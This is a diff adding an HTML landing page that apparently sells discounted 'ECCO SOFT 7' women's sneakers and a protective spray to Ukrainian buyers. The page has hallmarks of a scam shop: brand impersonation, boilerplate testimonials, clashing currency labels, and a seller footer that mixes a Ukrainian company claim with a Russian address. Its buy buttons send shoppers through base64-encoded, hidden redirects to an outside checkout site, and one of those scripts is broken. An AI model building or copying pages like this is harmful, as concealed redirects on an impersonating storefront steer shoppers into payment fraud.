@@ -1,0 +1,787 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <script src="js/jquery.min_1.js"></script>
+
+    <script>
+      function set_validator_errors() {
+        orderValidator.errorTitle = "Будь ласка, виправте наступні помилки";
+
+        orderValidator.errorNameField = "Iм'я";
+        orderValidator.errorNameMess = "Вкажіть своє ім'я";
+
+        orderValidator.errorPhoneField = "Контактний телефон";
+        orderValidator.errorPhoneMess = "Вкажіть вірний номер телефону";
+
+        orderValidator.errorAddress = "Вкажіть правильну адресу";
+        orderValidator.errorRequired = "обов'язкове поле";
+        orderValidator.errorMaxLength = "допустимий максимум {1} символів";
+        orderValidator.errorMinLength = "допустимий мінімум {1} символів";
+        orderValidator.errorEmailField = "E-mail";
+        orderValidator.errorEmail = "Вказано некоректний email";
+      }
+    </script>
+
+    <script>
+      window.app = {
+        timestamp: parseInt(new Date().getTime() / 1000),
+        jq: jQuery,
+        formAction: window.location.href,
+        leadToken: "663b77f17b6979.02541389",
+        offers: {
+          40935: {
+            id: 40935,
+            country: {
+              code: "EN",
+              name: "\u0423\u043a\u0440\u0430\u0438\u043d\u0430",
+            },
+            price: "39,99",
+            price2: "120,00",
+            currency: { code: "USA", name: "\u0433\u0440\u043d" },
+            discount: "",
+            delivery_price: "",
+            link: "",
+            product_sku: "",
+            prepaid_info_html: "",
+          },
+        },
+        currentOffer: {
+          id: 40935,
+          country: {
+            code: "EN",
+            name: "\u0423\u043a\u0440\u0430\u0438\u043d\u0430",
+          },
+          price: "39,99",
+          price2: "120,00",
+          currency: { code: "USA", name: "\u0433\u0440\u043d" },
+          discount: "",
+          delivery_price: "",
+          link: "",
+          product_sku: "",
+          prepaid_info_html: "",
+        },
+        allowedCountries: ["UA"],
+        _setOfferId: false,
+        streamHid: "Xx5c7jDd",
+        showcaseUrl: "",
+        disablePhoneMask: Boolean(),
+
+        setOffer: function (offerId) {
+          if (offerId == this._setOfferId) {
+            return;
+          }
+          this._setOfferId = offerId;
+          if (offerId) {
+            var offer = app.offers[offerId];
+            var previousOffer = app.currentOffer;
+            app.currentOffer = offer;
+            var event = this.jq.Event("offerchange");
+            event.previousOffer = previousOffer;
+            event.currentOffer = app.currentOffer;
+            this.jq(document).trigger(event);
+            this.updatePage(offer);
+          } else {
+            $("input[name=country]").val("");
+          }
+        },
+
+        updatePage: function (offer) {
+          $("x-newprice").html(offer.price);
+          $("x-oldprice").html(offer.price2);
+          $("x-currency").html(offer.currency.name);
+          $("input[name=offer], select[name=offer]").val(offer.id);
+          $("input[name=country]").val(offer.country.code);
+        },
+
+        blockForm: function () {
+          // Блокируем кнопки при отправке формы
+          $("input[type=submit]", $(this))
+            .prop("disabled", true)
+            .attr("disabled", true);
+          $("button", $(this)).prop("disabled", true).attr("disabled", true);
+          app.incompleteOrder.lock = true;
+          clearTimeout(app.incompleteOrder.timer);
+        },
+
+        unblockForm: function () {
+          $("input[type=submit]", $(this))
+            .prop("disabled", false)
+            .attr("disabled", false);
+          $("button[type=submit]", $(this))
+            .prop("disabled", false)
+            .attr("disabled", false);
+          app.incompleteOrder.lock = false;
+          clearTimeout(app.incompleteOrder.timer);
+        },
+      };
+    </script>
+    <script src="js/form.validate.js"></script>
+    <script src="js/interPhoneCodes.js"></script>
+    <script src="js/showcase.js"></script>
+    <script src="js/form.incomplete.js"></script>
+    <script src="js/main2.js"></script>
+
+    <meta charset="UTF-8" />
+    <title>ECCO SOFT 7</title>
+    <meta
+      name="viewport"
+      content="width=device-width, viewport-fit=cover, initial-scale=1, maximum-scale=1"
+    />
+    <meta name="format-detection" content="telephone=no" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&amp;display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="css/slick.min.css" />
+    <link rel="stylesheet" href="css/jquery.fancybox.min.css" />
+    <link rel="stylesheet" href="css/animate.min.css" />
+    <link rel="stylesheet" href="css/mfp.css" />
+    <link rel="stylesheet" href="css/libs.css" />
+    <link rel="stylesheet" href="css/main.css" />
+  </head>
+
+  <body data-path="./" data-currency="грн" data-discount="70">
+    <header class="header">
+      <img src="images/header-decor-1.png" alt="" class="decor decor-1" />
+      <img src="images/header-decor-2.png" alt="" class="decor decor-2" />
+      <img src="images/wave-1.png" alt="" class="decor decor-5" />
+      <img src="images/wave-2.png" alt="" class="decor decor-6" />
+      <img src="images/wave-1.png" alt="" class="decor decor-7" />
+      <img src="images/wave-2.png" alt="" class="decor decor-8" />
+      <div class="container">
+        <img src="images/leaf-1.png" alt="" class="decor decor-3" />
+        <img src="images/leaf-2.png" alt="" class="decor decor-4" />
+        <div class="header__inner">
+          <span class="logo">ECCO SOFT 7</span>
+          <h1 data-wow-delay="0.1s" class="header__title wow fadeInRight">
+            Nice discounts on women's leather shoes from ECCO!
+          </h1>
+          <h4 data-wow-delay="0.2s" class="header__subtitle wow fadeInRight">
+            Spend the spring in new shoes from a famous brand
+          </h4>
+          <div data-wow-delay="0.3s" class="header__list wow fadeInRight">
+            <p class="header__list__item">
+              NoSHANK sole manufacturing technology
+            </p>
+            <p class="header__list__item">
+              Shoes are made of natural materials
+            </p>
+            <p class="header__list__item">
+              Fast delivery, payment upon receipt
+            </p>
+          </div>
+          <div class="header__wrap wow fadeInLeft">
+            <img src="images/product-1.png" alt="" class="header__product-1" />
+            <img src="images/product-2.png" alt="" class="header__product-2" />
+            <img
+              src="images/smoke.png"
+              alt=""
+              class="decor header__wrap__decor"
+            />
+            <div class="sale">
+              <p class="sale__text">70%</p>
+            </div>
+          </div>
+          <div data-wow-delay="0.5s" class="price__wrap wow fadeInRight">
+            <div class="price">
+              <span class="old-price"
+                ><x-oldprice>120,00</x-oldprice>
+                <x-currency>USA</x-currency></span
+              >
+              <span class="new-price"
+                ><x-newprice>39,99</x-newprice>
+                <x-currency>USA</x-currency></span
+              >
+            </div>
+            <a href="#footer" data-hash="#order-form" class="button"
+              >buy it now</a
+            >
+            <p class="sale-date">
+              The campaign will last until:
+              <span class="span"></span>
+            </p>
+          </div>
+        </div>
+        <h3 class="header__advantages__title">why ecco soft sneakers</h3>
+        <div class="header__advantages">
+          <div
+            data-wow-delay="0.1s"
+            class="header__advantages__item wow fadeInUp"
+          >
+            <div class="header__advantages__item__image__wrap">
+              <img
+                src="images/header-icon-1.png"
+                alt=""
+                class="header__advantages__item__image"
+              />
+            </div>
+            <p class="header__advantages__item__text">
+              Genuine leather and shock absorbing sole
+            </p>
+          </div>
+          <div
+            data-wow-delay="0.3s"
+            class="header__advantages__item wow fadeInUp"
+          >
+            <div class="header__advantages__item__image__wrap">
+              <img
+                src="images/header-icon-2.png"
+                alt=""
+                class="header__advantages__item__image"
+              />
+            </div>
+            <p class="header__advantages__item__text">
+              Incredible comfort while walking
+            </p>
+          </div>
+          <div
+            data-wow-delay="0.5s"
+            class="header__advantages__item wow fadeInUp"
+          >
+            <div class="header__advantages__item__image__wrap">
+              <img
+                src="images/header-icon-3.png"
+                alt=""
+                class="header__advantages__item__image"
+              />
+            </div>
+            <p class="header__advantages__item__text">
+              ECCO Comfort Fibre System™ insoles
+            </p>
+          </div>
+        </div>
+      </div>
+    </header>
+    <main class="main">
+      <section class="video-advantages">
+        <div class="advantages">
+          <img src="images/wave-3.png" alt="" class="decor decor-1" />
+          <img src="images/branch-2.png" alt="" class="decor decor-2" />
+          <img src="images/leaf-5.png" alt="" class="decor decor-3" />
+          <div class="container">
+            <h3 class="advantages__title wow fadeInUp">
+              CHOOSE YOUR PERFECT STYLE
+            </h3>
+            <div class="advantages__inner">
+              <div class="advantages__product__wrap">
+                <img
+                  src="images/product-3.png"
+                  alt=""
+                  class="advantages__product"
+                />
+                <span class="advantages__product__number one active">1</span>
+                <span class="advantages__product__number two">2</span>
+                <span class="advantages__product__number three">3</span>
+              </div>
+              <div class="advantages__slider__wrap">
+                <div class="advantages__slider">
+                  <div class="advantages__item">
+                    <span class="advantages__item__number"> 1 </span>
+                    <h6 class="advantages__item__title">
+                      A WORLD-RENOWNED BRAND
+                    </h6>
+                    <p class="advantages__item__text">
+                      ECCO shoes are easily recognizable among other luxury
+                      goods.
+                    </p>
+                  </div>
+                  <div class="advantages__item">
+                    <span class="advantages__item__number"> 2 </span>
+                    <h6 class="advantages__item__title">
+                      UNIVERSAL CASUAL STYLE
+                    </h6>
+                    <p class="advantages__item__text">
+                      A democratic approach to combining clothes and accessories
+                      allows you to diversify your wardrobe as much as possible.
+                    </p>
+                  </div>
+                  <div class="advantages__item">
+                    <span class="advantages__item__number"> 3 </span>
+                    <h6 class="advantages__item__title">
+                      PERFECTLY SMOOTH SEAMS
+                    </h6>
+                    <p class="advantages__item__text">
+                      A neat toe, smooth lines, minimal decor and pastel colors
+                      - all this indicates to others that the shoe is expensive
+                      and solid.
+                    </p>
+                  </div>
+                </div>
+                <div class="arrow left"></div>
+                <div class="arrow right"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <section class="gallery">
+        <img src="images/gallery-decor-2.png" alt="" class="decor decor-1" />
+        <img src="images/gallery-decor-1.png" alt="" class="decor decor-2" />
+        <div class="container">
+          <div class="gallery__wrap">
+            <div class="gallery__item">
+              <a href=".//images/1.jpg" class="gallery__item__image"></a>
+            </div>
+            <div class="gallery__item">
+              <a href=".//images/2.jpg" class="gallery__item__image"></a>
+            </div>
+            <div class="gallery__item abs">
+              <a href=".//images/3.jpg" class="gallery__item__image"></a>
+            </div>
+            <div class="gallery__item">
+              <a href=".//images/4.jpg" class="gallery__item__image"></a>
+            </div>
+            <div class="gallery__item">
+              <a href=".//images/5_2.jpg" class="gallery__item__image"></a>
+            </div>
+            <div class="gallery__item">
+              <a href=".//images/6_2.jpg" class="gallery__item__image"></a>
+            </div>
+          </div>
+          <div class="arrows">
+            <div class="arrow left"></div>
+            <div class="arrow right"></div>
+          </div>
+          <div class="gallery__offer">
+            <img src="images/offer-decor-1.png" alt="" class="decor decor-3" />
+            <img src="images/offer-decor-2.png" alt="" class="decor decor-4" />
+            <img src="images/offer-decor-3.png" alt="" class="decor decor-5" />
+            <img src="images/offer-decor-4.png" alt="" class="decor decor-6" />
+            <h6 class="gallery__offer__title">
+              Action: <br />
+              It's cheaper together!
+            </h6>
+            <span class="gallery__offer__numbers">1+1</span>
+            <span class="gallery__offer__equals">=</span>
+            <span class="gallery__offer__text">DISCOUNT </span>
+          </div>
+        </div>
+      </section>
+      <section class="products">
+        <div class="container">
+          <div id="order" class="item item--multi first wow fadeInUp">
+            <div class="item__inner">
+              <div class="item__logo__wrap">
+                <h3 class="item__title">ECCO SOFT 7 (7742/7820)</h3>
+              </div>
+              <div class="item__price__wrap">
+                <div class="price">
+                  <span class="old-price"
+                    ><x-oldprice>120,00</x-oldprice>
+                    <x-currency>USA</x-currency></span
+                  >
+                  <span class="new-price"
+                    ><x-newprice>39,99</x-newprice>
+                    <x-currency>USA</x-currency></span
+                  >
+                </div>
+                <div class="item__sale">-70%</div>
+              </div>
+              <p class="item__special-offer">
+                When buying sneakers, there is a discount on flip-flops in the
+                amount of
+                <span class="span"> 79 USA</span>
+              </p>
+              <div class="item__slider__wrap item__slider__wrap--white active">
+                <div class="item__slider product-mag">
+                  <a href=".//images/7.jpg">
+                    <img src=".//images/7.jpg" alt="" />
+                  </a>
+                  <a href=".//images/5.jpg">
+                    <img src=".//images/5.jpg" alt="" />
+                  </a>
+                  <a href=".//images/6.jpg">
+                    <img src=".//images/6.jpg" alt="" />
+                  </a>
+                  <a href=".//images/8.jpg">
+                    <img src=".//images/8.jpg" alt="" />
+                  </a>
+                </div>
+                <div class="item__slider-nav">
+                  <img src=".//images/7.jpg" alt="" />
+                  <img src=".//images/5.jpg" alt="" />
+                  <img src=".//images/6.jpg" alt="" />
+
+                  <img src=".//images/8.jpg" alt="" />
+                </div>
+              </div>
+              <div class="item__slider__wrap item__slider__wrap--black">
+                <div class="item__slider product-mag">
+                  <a href=".//images/5.jpg">
+                    <img src=".//images/5_1.jpg" alt="" />
+                  </a>
+                  <a href=".//images/6.jpg">
+                    <img src="images/6_1.jpg" alt="" />
+                  </a>
+                  <a href=".//images/8.jpg">
+                    <img src="images/8_1.jpg" alt="" />
+                  </a>
+                </div>
+                <div class="item__slider-nav">
+                  <img src=".//images/5_1.jpg" alt="" />
+                  <img src=".//images/6_1.jpg" alt="" />
+                  <img src=".//images/7_1.jpg" alt="" />
+                  <img src=".//images/8_1.jpg" alt="" />
+                </div>
+              </div>
+              <div class="item__description">
+                <p class="item__description__item">Season: Spring</p>
+                <p class="item__description__item">Type: women's sneakers</p>
+                <p class="item__description__item">
+                  Upper: genuine leather, nubuck
+                </p>
+                <p class="item__description__item">
+                  Lining: genuine leather and textiles
+                </p>
+                <p class="item__description__item">Outsole: polyurethane</p>
+                <p class="item__description__item">Style: comfort, active</p>
+                <p class="item__description__item">Country: Denmark</p>
+                <p class="item__description__item item-colors">
+                  Color:
+                  <span class="colors">
+                    <span
+                      class="color active"
+                      data-price="1799"
+                      data-id="527"
+                      data-color="white"
+                    ></span>
+                    <span
+                      class="color black"
+                      data-price="1799"
+                      data-id="927"
+                      data-color="black"
+                    ></span>
+                  </span>
+                </p>
+              </div>
+              <form
+                action=""
+                method="POST"
+                class="order-form"
+                name="form1"
+                id="order-form"
+              >
+                <div class="order-form__inner">
+                  <div class="form-group">
+                    <input
+                      name="csrf_token"
+                      type="hidden"
+                      value="ac79ea7977629e0f7a1e6551e3f9a41e:1715173361"
+                    />
+                    <select
+                      name="offer"
+                      class="form-control country_chang"
+                      style="display: none"
+                    >
+                      <option
+                        data-country-code="UA"
+                        selected="selected"
+                        value="40935"
+                      >
+                        Ukraine
+                      </option>
+                    </select>
+                  </div>
+                </div>
+                <a href="#footer" class="button">buy it now</a>
+                <input
+                  name="comments"
+                  type="hidden"
+                  value="Жен ECCO SOFT 7 7742"
+                />
+              </form>
+            </div>
+          </div>
+          <div class="spray wow fadeInUp">
+            <img src="images/spary.png" alt="" class="spray__image" />
+            <img src="images/spray-decor-1.png" alt="" class="decor decor-6" />
+            <img src="images/spray-decor-2.png" alt="" class="decor decor-7" />
+            <div class="spray__logo__wrap">
+              <img src="images/logo-ecco.png" alt="" class="logo" />
+              <h3 class="spray__title">Spray</h3>
+              <div class="spray__sale">-70%</div>
+            </div>
+            <div class="spray__price__wrap">
+              <div class="price">
+                <span class="old-price"
+                  ><x-oldprice>120,00</x-oldprice>
+                  <x-currency>USA</x-currency></span
+                >
+                <span class="new-price"
+                  ><x-newprice>39,99</x-newprice>
+                  <x-currency>USA</x-currency></span
+                >
+              </div>
+              <div class="spray__sale">-70%</div>
+            </div>
+            <p class="spray__text">
+              A universal protective spray that helps keep ECCO shoes and
+              accessories clean, dry and stain-free.
+              <br />
+              Volume: 100 ml; <br />
+              Color: neutral.
+            </p>
+            <form action="" method="POST" class="order-form" name="form5">
+              <div class="form-group">
+                <input
+                  name="csrf_token"
+                  type="hidden"
+                  value="ac79ea7977629e0f7a1e6551e3f9a41e:1715173361"
+                />
+                <select
+                  name="offer"
+                  class="form-control country_chang"
+                  style="display: none"
+                >
+                  <option
+                    data-country-code="UA"
+                    selected="selected"
+                    value="40935"
+                  >
+                    Ukraine
+                  </option>
+                </select>
+              </div>
+              <a id="btn3" class="button">buy it now</a>
+              <input name="comments" type="hidden" value="Спрей Ecco Repel" />
+            </form>
+          </div>
+        </div>
+      </section>
+      <section class="testimonials-delivery">
+        <div class="testimonials">
+          <div class="container">
+            <img src="images/leaf-11.png" alt="" class="decor decor-1" />
+            <img src="images/branch-3.png" alt="" class="decor decor-2" />
+            <h3 class="testimonials__title">feedback from our customers</h3>
+            <div class="testimonials__slider__wrap">
+              <div class="testimonials__slider">
+                <div class="testimonials__item">
+                  <p class="testimonials__name">Oksana</p>
+                  <p class="testimonials__text">
+                    I liked the sneakers. Yesterday I saw them on the Internet
+                    and immediately ordered them. I recently picked them up from
+                    the post office and everything is cool! Thank you!
+                  </p>
+                </div>
+                <div class="testimonials__item">
+                  <p class="testimonials__name">Anya</p>
+                  <p class="testimonials__text">
+                    Comfortable, soft, cool sneakers made of genuine leather. I
+                    was also pleased with the price. I placed the order at night
+                    and it was sent in the morning. Upon receipt, I could not
+                    stop admiring them.
+                  </p>
+                </div>
+                <div class="testimonials__item">
+                  <p class="testimonials__name">Olya</p>
+                  <p class="testimonials__text">
+                    I bought a pair of white sneakers here. Not bad!) I really
+                    liked the store's approach to the client: I immediately
+                    warned the manager that I didn't have time, in a few minutes
+                    everything was arranged with the delivery address, size,
+                    etc.
+                  </p>
+                </div>
+                <div class="testimonials__item">
+                  <p class="testimonials__name">Svetik</p>
+                  <p class="testimonials__text">
+                    That's it, this spring I will enjoy evening walks in these
+                    sneakers) Bomb)
+                  </p>
+                </div>
+              </div>
+              <div class="arrow left"></div>
+              <div class="arrow right"></div>
+            </div>
+          </div>
+        </div>
+        <div class="delivery">
+          <div class="container">
+            <img src="images/leaf-12.png" alt="" class="decor decor-1" />
+            <h3 class="delivery__title">delivery and payment</h3>
+            <div class="delivery__inner">
+              <div class="delivery__item">
+                <img
+                  src="images/delivery-icon-1.png"
+                  alt=""
+                  class="delivery__icon"
+                />
+                <span class="delivery__number"> 01 </span>
+                <p class="delivery__headline">Application</p>
+                <p class="delivery__text">
+                  Place an order on our website by clicking the buy it now
+                  button
+                </p>
+              </div>
+              <div class="delivery__item">
+                <img
+                  src="images/delivery-icon-2.png"
+                  alt=""
+                  class="delivery__icon"
+                />
+                <span class="delivery__number"> 02 </span>
+                <p class="delivery__headline">Sending</p>
+                <p class="delivery__text">
+                  The operator will clarify the details with you if necessary
+                  and we will send your order
+                </p>
+              </div>
+              <div class="delivery__item">
+                <img
+                  src="images/delivery-icon-3.png"
+                  alt=""
+                  class="delivery__icon"
+                />
+                <span class="delivery__number"> 03 </span>
+                <p class="delivery__headline">Receiving</p>
+                <p class="delivery__text">
+                  In 2-3 days you will receive the goods by mail and pay for
+                  them
+                </p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    </main>
+    <footer id="footer" class="footer">
+      <div class="container">
+        <img src="images/leaf-13.png" alt="" class="decor decor-1" />
+        <img src="images/leaf-14.png" alt="" class="decor decor-2" />
+        <img src="images/leaf-15.png" alt="" class="decor decor-3" />
+        <img src="images/leaf-16.png" alt="" class="decor decor-4" />
+        <img src="images/branch-4.png" alt="" class="decor decor-5" />
+        <div class="footer__inner">
+          <span class="logo">ECCO SOFT 7</span>
+          <h2 class="footer__title">
+            BRANDED SHOES ARE NOW EVEN MORE AFFORDABLE
+          </h2>
+          <div class="footer__wrap">
+            <img
+              src="images/product-1.png"
+              alt=""
+              class="footer__product-1 wow fadeInLeft"
+            />
+            <img
+              src="images/product-2.png"
+              alt=""
+              class="footer__product-2 wow fadeInRight"
+            />
+            <img
+              src="images/smoke-2.png"
+              alt=""
+              class="decor footer__wrap__decor"
+            />
+            <div class="sale">
+              <p class="sale__text">70%</p>
+            </div>
+          </div>
+          <div class="price__wrap">
+            <div class="price">
+              <span style="color: red" class="new-price"
+                ><x-newprice>1+1=79,99 USA</x-newprice>
+              </span>
+            </div>
+
+            <div style="width: 100%; margin-bottom: 20px" class="select">
+              <select
+                style="
+                  font-size: 20px;
+                  font-family: sans-serif;
+                  height: 50px;
+                  width: 100%;
+                  border-radius: 16px;
+                  padding: 0 18px;
+                  box-shadow: 0px 5px 10px rgba(0, 0, 0, 0.15);
+                  outline: none;
+                  -ms-appearance: none;
+                  appearance: none !important;
+                  -moz-appearance: none;
+                  -webkit-appearance: none;
+                  background-color: transparent;
+                  position: relative;
+                  z-index: 3;
+                  color: #000;
+                  border: 1px solid #92278f;
+                "
+                class="size"
+              >
+                <option selected="" value="не вказано">Size:</option>
+                <option value="36">36 US</option>
+                <option value="37">37 US</option>
+                <option value="38">38 US</option>
+                <option value="39">39 US</option>
+                <option value="40">40 US</option>
+              </select>
+            </div>
+
+            <a id="btn5" class="button">buy it now</a>
+            <p class="sale-date">
+              The campaign will last until:
+              <span class="span"></span>
+            </p>
+          </div>
+        </div>
+      </div>
+      <div class="footer__bottom">
+        <center>
+          <p>
+            LIMITED LIABILITY COMPANY “GLOBAL TRADE” UKRAINIAN COMPANY NUMBER:
+            1244700005824 TIN: 4705109011 PST: 470501001 e-mail:
+            Global@Yandex.ru skype : GlobalTrade
+          </p>
+          <p>
+            188210, LENINGRAD REGION, LUZHSKY DISTRICT, TORKOVICHSKOYE VILLAGE,
+            PTORKOVICHI, RAILWAY 3, 20A
+          </p>
+
+          <p class="conf-link doclinks">
+            <a
+              class="nav-link"
+              href=""
+              onclick="window.open('/policy2.php'); return false;"
+              >Privacy Policy
+            </a>
+          </p>
+        </center>
+      </div>
+    </footer>
+    <script>
+      const btn5 = document.querySelector("#btn5");
+      btn5.addEventListener("click", action);
+
+      function action() {
+        window.location.replace(
+          atob(
+            "aHR0cHM6Ly9jaGVja291dC5wZXJmb21hbnNkZWFsLm1lL2NoZWNrb3V0Lz9vcmRlcj1KVGRDSlRCQkpUSXdKVEl3SlRJd0pUSXdKVEl5Ym1GdFpTVXlNaVV6UVNVeU1DVXlNa1ZEUTA4bE1qQlRUMFpVSlRJd055VXlNaVV5UXlVd1FTVXlNQ1V5TUNVeU1DVXlNQ1V5TW1SbGMyTnlhWEIwYVc5dUpUSXlKVE5CSlRJd0pUSXlNU1V5UWpFbE0wUTNPU1V5UXprNUpUSXdWVk5FSlRJeUpUSkRKVEJCSlRJd0pUSXdKVEl3SlRJd0pUSXljSEpwWTJVbE1qSWxNMEVsTWpBM09TNDVPU1V5UXlVd1FTVXlNQ1V5TUNVeU1DVXlNQ1V5TW1GdGIzVnVkQ1V5TWlVelFTVXlNREVsTWtNbE1FRWxNakFsTWpBbE1qQWxNakFsTWpKcGJXRm5aU1V5TWlVelFTVXlNQ1V5TW1oMGRIQnpKVE5CSlRKR0pUSkdhUzVwWW1JdVkyOGxNa1pDVkhKclFqQjBKVEpHVTJOeVpXVnVjMmh2ZEMwMU5Ua3VhbkJuSlRJeUpUSkRKVEJCSlRJd0pUSXdKVEl3SlRJd0pUSXljR0Y1ZFhKc0pUSXlKVE5CSlRJd0pUSXlKVEl5SlRKREpUQkJKVEl3SlRJd0pUSXdKVEl3SlRJeVkzVnljbVZ1WTNrbE1qSWxNMEVsTWpBbE1qSWxNalFsTWpJbE1rTWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qSnpkV05qWlhOelgzVnliQ1V5TWlVelFTVXlNQ1V5TW1oMGRIQnpKVE5CSlRKR0pUSkdlSEp4TG5CbGNtWnZiV0Z1YzJSbFlXd3ViV1VsTWtac1lXNWtaWElsTWtadmNtUmxjaVV5Um5OMVkyTmxjM011YUhSdGJDVXlNaVV5UXlVd1FTVXlNQ1V5TUNVeU1DVXlNQ1V5TW1aaGFXeGxaRjkxY213bE1qSWxNMEVsTWpBbE1qSm9kSFJ3Y3lVelFTVXlSaVV5Um5oeWNTNXdaWEptYjIxaGJuTmtaV0ZzTG0xbEpUSkdiR0Z1WkdWeUpUSkdiM0prWlhJbE1rWjFibk4xWTJObGMzTXVhSFJ0YkNVeU1pVXdRU1UzUkE9PSZsYW5nPWVu"
+          )
+        );
+      }
+    </script>
+    <script>
+      const btn3 = document.querySelector("#btn3");
+      btn3.addEventListener("click", action);
+
+      function action() {
+        window.location.replace(
+          atob(
+            "aHR0cHM6Ly9jaGVja291dC5wZXJmb21hbnNkZWFsLm1lL2NoZWNrb3V0Lz9vcmRlcj1KVGRDSlRCQkpUSXdKVEl3SlRJd0pUSXdKVEl5Ym1GdFpTVXlNaVV6UVNVeU1DVXlNbE53Y21GNUpUSXdSVU5EVHlVeU1pVXlReVV3UVNVeU1DVXlNQ1V5TUNVeU1DVXlNbVJsYzJOeWFYQjBhVzl1SlRJeUpUTkJKVEl3SlRJeU16a3VPVGtsTWpBM01DVXlOU1V5TUU5R1JpVXlNaVV5UXlVd1FTVXlNQ1V5TUNVeU1DVXlNQ1V5TW5CeWFXTmxKVEl5SlROQkpUSXdNemt1T1RrbE1rTWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qSmhiVzkxYm5RbE1qSWxNMEVsTWpBeEpUSkRKVEJCSlRJd0pUSXdKVEl3SlRJd0pUSXlhVzFoWjJVbE1qSWxNMEVsTWpBbE1qSm9kSFJ3Y3lVelFTVXlSaVV5Um1rdWFXSmlMbU52SlRKR1UzaDZNamxETnlVeVJsTmpjbVZsYm5Ob2IzUXROVFl4TG1wd1p5VXlNaVV5UXlVd1FTVXlNQ1V5TUNVeU1DVXlNQ1V5TW5CaGVYVnliQ1V5TWlVelFTVXlNQ1V5TWlVeU1pVXlReVV3UVNVeU1DVXlNQ1V5TUNVeU1DVXlNbU4xY25KbGJtTjVKVEl5SlROQkpUSXdKVEl5SlRJMEpUSXlKVEpESlRCQkpUSXdKVEl3SlRJd0pUSXdKVEl5YzNWalkyVnpjMTkxY213bE1qSWxNMEVsTWpBbE1qSm9kSFJ3Y3lVelFTVXlSaVV5Um5oeWNTNXdaWEptYjIxaGJuTmtaV0ZzTG0xbEpUSkdiR0Z1WkdWeUpUSkdiM0prWlhJbE1rWnpkV05qWlhOekxtaDBiV3dsTWpJbE1rTWxNRUVsTWpBbE1qQWxNakFsTWpBbE1qSm1ZV2xzWldSZmRYSnNKVEl5SlROQkpUSXdKVEl5YUhSMGNITWxNMEVsTWtZbE1rWjRjbkV1Y0dWeVptOXRZVzV6WkdWaGJDNXRaU1V5Um14aGJtUmxjaVV5Um05eVpHVnlKVEpHZFc1emRXTmpaWE56TG1oMGJXd2xNaklsTUVFbE4wUT0mbGFuZz1lbg=="
+          )
+        );
+        const decodedString = atob(encodedString);
+        window.location.replace(decodedString);
+      }
+    </script>
+
+    <script src="js/jquery.min.js"></script>
+    <script src="js/jquery.validate.min.js"></script>
+    <script src="js/validate-script.js"></script>
+
+    <script src="js/jquery.fancybox.min.js"></script>
+    <script src="js/wow.min.js"></script>
+    <script src="js/slick.min.js"></script>
+    <script src="js/mfp.js"></script>
+    <script src="js/common.js"></script>
+  </body>
+</html>
